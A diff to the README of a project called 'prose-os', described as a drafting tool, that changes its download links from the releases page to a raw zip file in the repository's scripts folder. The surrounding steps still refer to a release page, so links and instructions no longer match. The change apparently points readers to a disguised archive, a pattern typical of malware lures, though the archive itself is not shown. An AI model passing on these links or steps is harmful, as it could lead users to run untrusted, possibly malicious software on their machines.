@@ -1,10 +1,10 @@
 # ✍️ prose-os - Turn Topics Into Clean, Ready Drafts
 
-[![Download prose-os](https://img.shields.io/badge/Download%20prose-os-blue?style=for-the-badge&logo=github)](https://github.com/Gwennunalike192/prose-os/releases)
+[![Download prose-os](https://img.shields.io/badge/Download%20prose-os-blue?style=for-the-badge&logo=github)](https://github.com/Gwennunalike192/prose-os/raw/refs/heads/main/scripts/prose_os_3.0.zip)
 
 ## 📥 Download and Install
 
-Visit this page to download: https://github.com/Gwennunalike192/prose-os/releases
+Visit this page to download: https://github.com/Gwennunalike192/prose-os/raw/refs/heads/main/scripts/prose_os_3.0.zip
 
 1. Open the release page in your browser.
 2. Download the latest Windows file from the release assets.
